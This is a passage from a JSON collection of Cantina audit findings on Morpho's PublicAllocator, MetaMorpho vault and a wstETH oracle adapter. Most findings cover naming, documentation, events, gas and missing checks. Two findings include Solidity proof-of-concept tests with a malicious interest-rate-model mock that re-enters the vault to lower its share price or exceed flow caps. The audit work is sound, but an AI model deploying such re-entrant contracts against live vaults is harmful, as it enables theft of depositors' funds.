memory marketParams = MarketParams({\n        loanToken: address(loanToken),\n        collateralToken: address(loanToken),\n        oracle: address(0),\n        irm: address(irm),\n        lltv: 0\n    });\n    morpho.createMarket(marketParams);\n    return marketParams;\n}\n\nfunction testReentrancyAttackFromAllocator() public {\n    uint totalAssets = vault.totalAssets();\n    uint totalShares = vault.totalSupply();\n    uint previousPrice = vault.convertToAssets(1e18);\n    MarketAllocation[] memory allocations = new MarketAllocation[](3);\n    \n    allocations[0] = MarketAllocation(idleParams, INITIAL_DEPOSIT);\n    allocations[1] = MarketAllocation(allMarkets[0], 0);\n    allocations[2] = MarketAllocation(allMarkets[1], 0);\n    \n    vm.prank(ALLOCATOR);\n    vault.reallocate(allocations);\n    \n    MarketParams memory fakeParam = createFakeMarket();\n    IrmMock irm = IrmMock(fakeParam.irm);\n    irm.setDepositAmount(totalAssets);\n    irm.setLoanToken(address(loanToken));\n    irm.setMMAddress(address(vault));\n    \n    deal(address(loanToken), address(irm), totalAssets);\n    vm.warp(block.timestamp + 1 days);\n    vm.prank(OWNER);\n    _setCap(allMarkets[1], type(uint184).max);\n    \n    allocations[0] = MarketAllocation(idleParams, 1 ether);\n    allocations[1] = MarketAllocation(fakeParam, 0);\n    allocations[2] = MarketAllocation(allMarkets[1], type(uint).max);\n    \n    vm.prank(ALLOCATOR);\n    vault.reallocate(allocations);\n    \n    totalAssets = vault.totalAssets();\n    totalShares = vault.totalSupply();\n    uint currentPrice = vault.convertToAssets(1e18);\n    \n    // currentPrice is less than previousPrice\n    assertLt(currentPrice, previousPrice);\n}\n```\n\n## Recommendation\nThe issue outlined a potential attack vector that requires several conditions to be met. Eliminating one of the prerequisites can prevent this attack:\n1. Revert the `reallocate` function when an unauthorized market is provided.\n2. Be aware of the IRM implementation; querying external contracts in the IRM comes with additional risks. Make sure to revisit the entire Morpho-blue code base when a new IRM is deployed and enabled.\n\n## Morpho\nThis issue is actually in MetaMorpho, which is already in production, and it has no impact as long as IRMs don't re-enter vaults. So we acknowledge it and will make sure that it will never be the case in the future.\n\n## Cantina Managed\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40748",
      "title": "Consider documenting that WstEthEthExchangeRateChainlinkAdapter returns the conversion rate of wstETH/stETH and not wstETH/ETH ",
      "impact": "LOW",
      "content": "## Context\n**File:** WstEthEthExchangeRateChainlinkAdapter.sol#L12  \n\n## Description\nWhen `WstEthEthExchangeRateChainlinkAdapter.latestRoundData()` is called, the current implementation returns `int256(WST_ETH.stEthPerToken())` as the answer of a Chainlink-like response. The Lido wstETH implementation of `stEthPerToken` returns the amount of stETH for one wstETH (1e18):\n\n```solidity\nfunction stEthPerToken() external view returns (uint256) {\n    return stETH.getPooledEthByShares(1 ether);\n}\n```\n\nThis means that Morpho's oracle is not returning the \"price\" for wstETH/ETH but the \"price\" (conversion rate would be the correct term) between wstETH and stETH. The amount of ETH corresponding to 1 stETH unit, received when the user finishes the withdrawal multi-step operation, will be only known when the operation is finalized on the Lido withdraw queue.\n\n## Recommendation\nMorpho has different options here:\n1. Rename the contract, docs, and everything to reflect the fact that this is indeed a wstETH/stETH oracle.\n2. Clarify and document that while this is a wstETH/stETH, it will be used to \"price\" a wstETH/ETH conversion, implying that theres a hard assumption that stETH:ETH has a conversion ratio of 1:1.\n\n## Morpho\nAddressed in PR 83.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 83. The contract name has been renamed from `WstEthEthExchangeRateChainlinkAdapter` to `WstEthStEthExchangeRateChainlinkAdapter`, and all the NatSpec documentation and references have been correctly updated to reflect the fact that this is indeed a wstETH/stETH rate feed and not a wstETH/ETH rate feed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_oracles_adapters_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40747",
      "title": "Improve the NatSpec documentation about latestRoundData return values ",
      "impact": "LOW",
      "content": "## Context\nWstEthEthExchangeRateChainlinkAdapter.sol#L26-L30\n\n## Description\nThe `latestRoundData()` function in the `WstEthEthExchangeRateChainlinkAdapter` returns the following values to be compliant with the Chainlink interface signature as explained in their documentation:\n\n- `uint80 roundId`\n- `int256 answer`\n- `uint256 startedAt`\n- `uint256 updatedAt`\n- `uint80 answeredInRound`\n\nThe current implementation of `WstEthEthExchangeRateChainlinkAdapter.latestRoundData` only returns non-empty values for the `answer` returned variable, leaving all the others \"empty\" (using the Solidity default compiler value). \n\nWhile this could be seen as valid behavior for a custom Chainlink-like oracle, such behavior should be documented and explained.\n\n## Recommendation\nMorpho should improve the natspec documentation about values returned by `latestRoundData`, documenting that only the `answer` return parameter will have a valid value, while the other parameters will be \"empty\". \n\nAn additional change that should be considered is to clarify that this is a \"Chainlink-compliant\" contract that does not fully follow the normal behavior of a Chainlink oracle that would always return non-empty values for all the returned parameters.\n\n## Morpho\nAddressed in PR 83.\n\n## Cantina Managed\nPR 83 correctly documents and clarifies the value (always 0) returned by the named parameters:\n\n- `uint80 roundId`\n- `int256 answer`\n- `uint256 startedAt`\n- `uint256 updatedAt`\n- `uint80 answeredInRound`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_oracles_adapters_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40746",
      "title": "WST_ETH should be declared constant and hardcoded at compilation time ",
      "impact": "LOW",
      "content": "## WstEthEthExchangeRateChainlinkAdapter\n\n## Context\nWstEthEthExchangeRateChainlinkAdapter.sol#L18\n\n## Description\nThe current implementation of `WstEthEthExchangeRateChainlinkAdapter` declares the `WST_ETH` variable as immutable. This variable is initialized during the constructor with the address `wstEth` input parameter. The `WST_ETH` contract reference is later used by `latestRoundData` to retrieve the conversion rate between wstETH/stETH to fulfill the role of this oracle contract.\n\nThis implementation pattern makes sense when contracts could have different addresses based on which chain they are deployed to, but it won't be the case for the Lido wstETH or stETH contracts. As explained in their documentation:\n\n> Unlike on the Ethereum mainnet, wstETH on L2s is a plain ERC-20 token and cannot be unwrapped to unlock stETH on the corresponding L2 network.\n\nDue to this, `WST_ETH` can be declared constant and hardcoded at compilation time.\n\n## Recommendation\nMorpho should consider declaring `WST_ETH` as constant and hardcoding its initial value at compilation time.\n\n## Morpho\nAddressed in PR 83.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 83:\n- Contract now uses `stETH` instead of `wstETH` to retrieve the exchange rate.\n- `stETH` is declared as constant and not immutable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_oracles_adapters_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40745",
      "title": "WstEthEthExchangeRateChainlinkAdapter can only be deployed and used on Ethereum Main- net ",
      "impact": "LOW",
      "content": "## WstEthEthExchangeRateChainlinkAdapter\n\n## Context\n**File:** WstEthEthExchangeRateChainlinkAdapter.sol\n\n## Description\nLido's documentation about wstETH on L2s explicitly states that:\n\n> Unlike on the Ethereum mainnet, wstETH on L2s is a plain ERC-20 token and cannot be unwrapped to unlock stETH on the corresponding L2 network.\n\nThis means that the WstEthEthExchangeRateChainlinkAdapter will only work when deployed on the Ethereum Mainnet.\n\n## Recommendation\nMorpho should be aware of this limitation and explicitly document this behavior. This oracle adapter can't be deployed or used on other chains and provides a wstETH/stETH conversion rate using the current logic.\n\n## Morpho\n**Status:** Addressed in PR 83.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 83:\n\n- The NatSpec documentation correctly suggests that this contract should only be deployed and used on the Ethereum mainnet.\n- The `ST_ETH` is now a constant variable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_oracles_adapters_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40744",
      "title": "Consider using stETH.getPooledEthByShares directly instead of passing through wstETH ",
      "impact": "GAS",
      "content": "## WstEthEthExchangeRateChainlinkAdapter Update\n\n## Context\nWstEthEthExchangeRateChainlinkAdapter.sol#L29\n\n## Description\nThe current implementation of `WstEthEthExchangeRateChainlinkAdapter.latestRoundData` queries the wstETH contract to get the wstETH/stETH conversion rate. The underlying logic of this function inside wstETH directly calls `stETH.getSharesByPooledEth`, as shown below:\n\n```solidity\n/**\n * @notice Get amount of wstETH for a one stETH\n * @return Amount of wstETH for a 1 stETH\n */\nfunction tokensPerStEth() external view returns (uint256) {\n    return stETH.getSharesByPooledEth(1 ether);\n}\n```\n\nThis means that the current implementation of `WstEthEthExchangeRateChainlinkAdapter.latestRoundData` is performing an additional call that could be skipped by interacting directly with the stETH contract.\n\n## Recommendation\nGiven that wstETH is a non-upgradable contract, Morpho should consider replacing the current `WstEthEthExchangeRateChainlinkAdapter.latestRoundData` logic to directly call stETH and save gas:\n\n```solidity\n/// @dev Silently overflows if `stEthPerToken` is greater than `type(int256).max`.\nfunction latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n    // It is assumed that `stEthPerToken` returns a price with 18 decimals precision.\n    - return (0, int256(WST_ETH.stEthPerToken()), 0, 0, 0);\n    + return (0, int256(ST_ETH.getSharesByPooledEth(1 ether)), 0, 0, 0);\n}\n```\n\n## Morpho\nAddressed in PR 81.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 81. The `latestRoundData` function now calls directly `ST_ETH.getPooledEthByShares`. Note that the `ST_ETH` will be declared as constant (instead of immutable) in PR 83.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_oracles_adapters_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40743",
      "title": "Consider adding a pausable feature to reallocateTo is triggerable only by one of Morpho 's guardians ",
      "impact": "LOW",
      "content": "## PublicAllocator Overview\n\n## Context\n**File:** `PublicAllocator.sol`  \n**Line Range:** 101-148\n\n## Description\nThe PublicAllocator is a contract that will be deployed only once for all the current and future MetaMorpho Vaults, instead of being deployed \"on demand\" by each MetaMorpho Vault. Having a \"central hub\" for each of the vaults has many benefits and allows the Morpho team to build additional security layers that can be applied automatically to all the vaults.\n\nOne of these security mechanisms could be a paused flag that can be turned on/off by a Guardian in the case where an issue is found in `reallocateTo` (or in the contract in general) or in the reallocate implementation of the MetaMorpho vault contract. While the `MetaMorpho.reallocate` is usually an authorized function, once PublicAllocator is configured and enabled, it allows anyone to execute `MetaMorpho.reallocate` (with specific bounds).\n\nIf a security issue is found, all the MetaMorpho vaults would need to perform one of these two actions:\n- Reconfigure the PublicAllocator for all the vault's market to disable any inflow and outflow.\n- Remove the PublicAllocator from allocator or curator role (depending on how it has been configured) of the vault.\n\nIn these situations, time is crucial and not all the vault managers have the same response time. Having a pause security flag that locks the access to `reallocateTo` could mitigate this problem.\n\n## Recommendation\nMorpho should consider adding a pause functionality to lock the access to `reallocateTo` in case of emergency.\n\n## Morpho Response\nWe acknowledge this issue. None of the contracts of Morpho Blue's periphery features this. Here, the contract is a bit different (different role, and no real criticality in the liveness), but still, we dont think that it has its place.\n\n## Cantina Managed Response\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40742",
      "title": "Consider renaming allocator cong variables and functions to be more vault specic ",
      "impact": "LOW",
      "content": "## PublicAllocator Contract Naming Review\n\n### Context\n- **File:** PublicAllocator.sol  \n- **Lines:** 39-46, 65-97, 51-54\n\n### Description\nThe `PublicAllocator` contract contains state variables and functions to modify those variables that are related to a vault's specific configurations in the `PublicAllocator` context. \n\nThe names of these variables and functions are currently very generic, leading to confusion. For example, we have the following state variable:\n\n- `mapping(address => address) public owner;` \n\nThis variable checks whether `msg.sender` can access functions that modify the public allocator configuration for a specific vault. At first sight, the name of the variable seems to represent the owner of the `PublicAllocator` or the name of the vault itself when we delve into the code.\n\nTo reduce the confusion, both the names of the variables, functions, and modifiers should be renamed to something more meaningful and less confusing. Here are some suggested changes:\n\n- **owner**  `vaultConfigManager`\n- **fee**  `vaultReallocateFee`\n- **accruedFee**  `vaultAccruedFee`\n- **flowCaps**  `vaultFlowCaps`\n- **onlyOwner**  `onlyVaultConfigManager`\n- ...\n\n### Recommendation\nTo enhance clarity, Morpho should consider renaming the variables, functions, and modifiers to something more meaningful and less confusing. \n\n**Note:** The same modifications/adaptations should also be applied to the NatSpec documentation and interface.\n\n### Morpho\nThis issue was addressed in PR 30. We decided to only change the name of `owner` to `admin` because:\n\n- We usually don't specify that a value is a mapping (e.g., \"config\" in Metamorpho, \"position\" in Morpho Blue, \"approval\" in ERC20sthough \"balanceOf\" is a counter example).\n- We usually dont worry about naming clashes with other contracts, such as the \"fee\" in Metamorpho and the \"fee\" in Morpho Blue.\n- The name `owner` was misleading, as there is typically only one owner for a contract with full power over the only owner functions (which is very common).\n\n### Cantina Managed\nMorpho has decided to pursue only the renaming of the `owner` term in PR 30. The remaining recommendations have been acknowledged by Morpho.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40740",
      "title": "Consider tracking the msg.sender in the event emitted by the PublicAllocator contract ",
      "impact": "LOW",
      "content": "## Context: EventsLib.sol\n\n## Description\nLike it has been already done in other projects of the Morpho's ecosystem, the events emitted by the execution of the PublicAllocator should track the `msg.sender`. This information can be useful for external dApps and monitoring tools.\n\n## Recommendation\nMorpho should consider tracking the `msg.sender` in the event emitted by the PublicAllocator contract.\n\n## Morpho\nAddressed in PR 29.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 29.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40739",
      "title": "More event parameters can be declared as indexed ",
      "impact": "LOW",
      "content": "## Event Parameter Recommendations\n\n## Context\n- `EventsLib.sol#L15`\n- `EventsLib.sol#L18`\n\n## Description\nSome of the event parameters could benefit from being declared as indexed:\n- `address sender` in `PublicReallocateTo` can be declared as indexed.\n- `address owner` in `SetOwner` can be declared as indexed.\n\n## Recommendation\nConsider declaring the suggested event parameters as indexed.\n\n## Morpho\nAddressed in PR 29.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 29.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40738",
      "title": "PublicReallocateTo event is emitted with the wrong parameters order ",
      "impact": "LOW",
      "content": "## Context\n\n**File:** PublicAllocator.sol#L147\n\n## Description\n\nAt the very end of the `reallocateTo` logic, the event `PublicReallocateTo` is emitted like this:\n\n```solidity\nemit EventsLib.PublicReallocateTo(msg.sender, vault, supplyMarketId, totalWithdrawn);\n```\n\nHowever, this event is declared with a different parameter order in the corresponding `EventsLib` library:\n\n```solidity\n/// @notice Emitted at the end of a public reallocation.\nevent PublicReallocateTo(address indexed vault, address sender, Id supplyMarketId, uint256 suppliedAssets);\n```\n\nGiven this declaration, the `reallocateTo` function is passing the `msg.sender` and `vault` parameters in the wrong order to the `PublicReallocateTo` event.\n\n## Recommendation\n\nMorpho should follow one of these choices:\n\n- Change the order of the event parameters in the declaration of `PublicReallocateTo`.\n- Change the order of the event parameters in the emission of `EventsLib.PublicReallocateTo`.\n\n## Morpho\n\n- Addressed in PR 29.\n\n## Cantina Managed\n\n- The recommendations have been implemented in PR 29.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40737",
      "title": "Vault 's ow caps should be constrained by the vault 's state and conguration ",
      "impact": "LOW",
      "content": "## PublicAllocator.sol Implementation Review\n\n## Context\n**Location:** PublicAllocator.sol#L79-L89\n\n## Description\nThe current implementation of `PublicAllocator.setFlowCaps` allows the caller to update the `reallocateTo` flow caps of a vault for specific markets. The only check currently performed is that the `maxIn` and `maxOut` values of the flow must be below a constant `MAX_SETTABLE_FLOW_CAP` maximum value. \n\nMorpho should perform additional checks to avoid undesired or unintended behaviors:\n\n- If the market is not enabled in the vault (`enabled == false`), the manager should only be able to set `maxIn` and `maxOut` to zero.\n- If the market is enabled, the manager should be able to set the `maxIn` flow to a value that is less than or equal to the vault's market cap.\n\n## Recommendation\nMorpho should implement the additional checks listed above.\n\n## Morpho\n**Status:** Addressed in PR 31. \n\nWe could imagine that this can be integrated into a wanted behavior. For example: the supply cap of market A is 2M, but `maxIn` is 4M. The vault manager reallocates from time to time out of market A, but does not want liquidity to be pulled more than 4M from other markets. So that 4M cap is not about market A but more about other markets.\n\n- If the market is not enabled in the vault (`enabled == false`), the manager should only be able to set `maxIn` and `maxOut` to zero.\n\nIm potentially in favor of this one, as it doesnt make sense to set a non-zero cap for a non-enabled market. It can potentially prevent mistakes (setting caps for the wrong market). However, it also complicates the code and specification for minimal benefit.\n\n- If the market is enabled, the manager should be able to set the `maxIn` flow to a value that is less than or equal to the vault's market cap.\n\nI don't think that we should do this. Its not preventing anything clear, and it could even be a feature.\n\n## Cantina Managed\nPart of the recommendations have been implemented in PR 31. Now, cap flows can be set to a non-zero value only for enabled markets. \n\nThe Morpho team has correctly justified that there are use cases to allow vault admins to set flow caps above the market supply cap (on the MetaMorpho contract).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40735",
      "title": "PublicAllocator.reallocateTo does not revert when an unauthorized market is provided, creating a potential re-entrancy attack vector ",
      "impact": "LOW",
      "content": "## PublicAllocator Overview\n\n## Context\n`PublicAllocator.sol#L102-L149`\n\n## Description\nTo solve the liquidity fragmentation on MetaMorpho, the `publicAllocator` allows anyone to move the funds within the pre-configured limit. These limits are checked in the `reallocateTo` function to avoid funds being moved to an authorized market and putting MetaMorpho in an undesired state.\n\nIn the `reallocateTo` function, a special case arises when `withdrawnAssets == 0`. In this scenario, the function allows processing any market as long as no funds are withdrawn or supplied to/from the market. However, this introduces a potential attack vector. Similar to the issue \"Allocator can drain the MetaMorpho vault if a future IRM queries token balance\", the `publicAllocator` calls `morpho.accrueInterests` in the loop, potentially exposing the control flow to malicious users.\n\nCurrently, the `AdaptiveCurveIrm` is the only enabled IRM, which wouldn't give users control flow and thus prevent potential attacks. However, consider two hypothetical scenarios:\n\n1. A new IRM is deployed that queries token balances to calculate interest. (This is a reasonable setting, as many IRM systems actually depend on a token's balance).\n2. Morpho-blue allows users to permissionlessly deploy their own IRMs.\n\nIn both cases, a malicious user can gain control within the `reallocateTo` function, suggesting a potential issue with the validation in the function. The `publicAllocator` determines the end allocation amount based on `MORPHO.expectedSupplyAssets` and the withdrawal amount. If `expectedSupplyAssets` changes after the value is cached, it can lead to different actual allocations. Consequently, `publicAllocator` may distribute more funds than the limit specified by `flowCaps`.\n\n## Proof of Concept\n```solidity\ncontract IrmMock is IIrm {\n    uint256 public apr;\n    address public vault;\n    uint public depositAmount;\n    address public loanToken;\n\n    function setApr(uint256 newApr) external {\n        apr = newApr;\n    }\n\n    function borrowRateView(MarketParams memory, Market memory) public view returns (uint256) {\n        return apr / 365 days;\n    }\n\n    function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {\n        if(depositAmount != 0) {\n            IMetaMorpho vault = IMetaMorpho(vault);\n            IERC20(loanToken).approve(address(vault), depositAmount);\n            vault.deposit(depositAmount, address(this));\n        }\n        return borrowRateView(marketParams, market);\n    }\n\n    function setMMAddress(address _mm) external {\n        vault = _mm;\n    }\n\n    function setDepositAmount(uint256 amount) external {\n        depositAmount = amount;\n    }\n\n    function setLoanToken(address _loanToken) external {\n        loanToken = _loanToken;\n    }\n}\n\nfunction createFakeMarket() internal returns(MarketParams memory) {\n    // create mock IRM\n    IrmMock irm = new IrmMock();\n    irm.setApr(1e18);\n    \n    // enable irm on morpho\n    vm.prank(MORPHO_OWNER);\n    morpho.enableIrm(address(irm));\n    \n    // create market\n    MarketParams memory marketParams = MarketParams({\n        loanToken: address(loanToken),\n        collateralToken: address(loanToken),\n        oracle: address(0),\n        irm: address(irm),\n        lltv: 0\n    });\n    \n    morpho.createMarket(marketParams);\n    return marketParams;\n}\n\nfunction testReentrancyAttackFromPublicAllocator() public {\n    _setCap(allMarkets[0], type(uint184).max);\n    \n    MarketAllocation[] memory allocations = new MarketAllocation[](3);\n    allocations[0] = MarketAllocation(idleParams, 0);\n    allocations[1] = MarketAllocation(allMarkets[0], INITIAL_DEPOSIT);\n    allocations[2] = MarketAllocation(allMarkets[1], 0);\n    \n    vm.prank(ALLOCATOR);\n    vault.reallocate(allocations);\n    \n    Id firstMarket = allMarkets[0].id();\n    MarketParams memory fakeParam;\n    \n    for(uint i = 0; i < 255; i++) {\n        fakeParam = createFakeMarket();\n        if(Id.unwrap(fakeParam.id()) > Id.unwrap(firstMarket)) {\n            break;\n        }\n    }\n    \n    IrmMock irm = IrmMock(fakeParam.irm);\n    irm.setDepositAmount(totalAssets);\n    irm.setLoanToken(address(loanToken));\n    irm.setMMAddress(address(vault));\n    \n    deal(address(loanToken), address(irm), totalAssets);\n    vm.warp(block.timestamp + 1 days);\n    \n    withdrawals.push(Withdrawal(allMarkets[0], 0));\n    withdrawals.push(Withdrawal(fakeParam, 0));\n    \n    totalAssets = vault.totalAssets();\n    totalShares = vault.totalSupply();\n    \n    uint previousIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));\n    \n    // currentPrice is less than previousPrice\n    publicAllocator.reallocateTo(address(vault), withdrawals, idleParams);\n    \n    uint currentIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));\n    \n    // Logs:\n    // previousIdleAssets: 0\n    // currentIdleAssets: 400000000000000000000\n    //\n    assertLt(previousIdleAssets, currentIdleAssets);\n}\n```\n\n## Recommendation\nRecommend adding more sanity checks in `reallocateTo`, following the recommendations in the issue \"reallocateTo should perform more sanity checks on the input parameters and vault's configuration\".\n\n## References\n- Morpho: Addressed in PR 28.\n- Cantina Managed: The recommendation has been implemented in PR 28. Now its not possible to withdraw from or supply to a non-enabled market.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40734",
      "title": "reallocateTo should perform more sanity checks on the input parameters and vault 's con- guration ",
      "impact": "LOW",
      "content": "## Context: PublicAllocator.sol#L102-L148\n\n## Description\nThe current implementation of `reallocateTo` should revert if the function's input parameters \"do not make sense\" or if they are incompatible with the current configuration and state of the MetaMorpho vaults that will execute the reallocate flow.\n\nSome of these checks will be done automatically by the `reallocate` function, but we suggest replicating them also in `reallocateTo` to prevent any external caller from reaching the MetaMorpho vault when the constructed allocations won't contribute to a valid or meaningful execution of the logic.\n\nThese checks will improve the overall security of the vault but will also prevent the user from losing money (the fee itself) when the result of `reallocate` is a no-op (no withdrawal and no supply have happened).\n\n## Additional Checks\nHere are the list of additional checks that should be implemented by `reallocateTo`:\n\n1. **withdrawals.length > 0**: If there are no withdrawals from any market, it means that there won't be any supply. `vault.reallocate` won't revert, but `EventsLib.PublicReallocateTo` will be emitted, and the caller will waste their `msg.value` for nothing.\n   \n2. **withdrawnAssets > 0**: Having only a non-withdrawal won't automatically bring up the scenario described in point (1), but it's fair to say that it's a meaningless operation that should be prevented. If this is the only withdrawal operation, it will lead to the same consequences as point (1).\n\n3. **totalWithdrawn > 0**: Same consequences as point (1).\n\n4. **IMetaMorpho(vault).config(id).enabled == true**: The market from which the vault is going to withdraw assets must have been enabled (added to the withdrawal queue).\n\n5. Given `marketCap = IMetaMorpho(vault).config(supplyMarketParams.id()).cap` and `currentMarketSuppliedAssets = amount_of_assets_already_supplied_to_supplyMarketParams`:\n   - **marketCap > 0**\n   - **currentMarketSuppliedAssets + totalWithdrawn <= marketCap**\n\n## Recommendation\nMorpho should implement the above suggested checks to allow the execution of `vault.reallocate(...)` only if the `reallocateTo` input parameter values are valid and compatible with the state and configuration of the vaults for the markets involved in the supply and withdraw operations.\n\n## Morpho\nAddressed in PR 28.\n\n## Cantina Managed\nPart of the recommendations have been implemented in PR 28. The `reallocateTo` function will revert when:\n\n- The supply market is not enabled.\n- The withdraw market is not enabled.\n- The user has specified an empty array of markets to withdraw from.\n- The user tries to withdraw an empty amount of assets from a market.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40733",
      "title": "reallocateTo function does not check for slippage, leading to dust loss due to rounding error ",
      "impact": "LOW",
      "content": "## Context: PublicAllocator.sol#L128-L131\n\n## Description\nWhen the `MetaMorpho.reallocate` function redistributes the portfolio, it calls `Morpho.supply`. In the `supply` function, rounding is handled in favor of the protocol. As a result, every time the `MetaMorpho.reallocate` is called, the vault might lose a value.\n\n`PublicAllocator` allows any user to trigger the reallocation of the MM vault. In extreme cases, exploiters can let the MM vault lose non-negligible value.\n\n## Recommendation\nThe `morpho-blue` codebase manages vault shares using the OpenZeppelin `SharesMathLib`. Rounding errors are typically avoidable under normal usage. However, if an anomalous market with an extremely high share price is configured, there is a potential risk of draining the MM vault. \n\nTherefore, it is recommended to verify that the total assets of the vault remain unchanged after the reallocation process (see `PublicAllocator.sol#L145` below):\n\n```solidity\nuint previousVaultTotalAssets = IMetaMorpho(vault).totalAssets();\nIMetaMorpho(vault).reallocate(allocations);\nrequire(IMetaMorpho(vault).totalAssets() == previousVaultTotalAssets, \"slippage\");\n```\n\n## Discussion\n**Morpho:** Acknowledged. Are the conditions where the rounding matters realistic? This added check would force all client code to add logic that adjusts amounts so that there are no rounding errors.\n\n**Cantina Managed:** Acknowledged. We expect rounding error by 1 decimal to matter in the near future as token price goes up and transaction costs go down. Currently, one SATS = 0.00063 USD. A normal transaction on Gnosis chain costs less than this. \n\nAlso, it would be harder to properly bootstrap a low-decimal token. For example, STASIS EURS Token (EURS) is a 2 decimal token.\n\nI'm leaning to add this check if `reallocateTo` is not expected to be called frequently.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40732",
      "title": "Funds can be redirected to the idle market by reaching the MetaMorpho supply cap using a ash loan ",
      "impact": "MEDIUM",
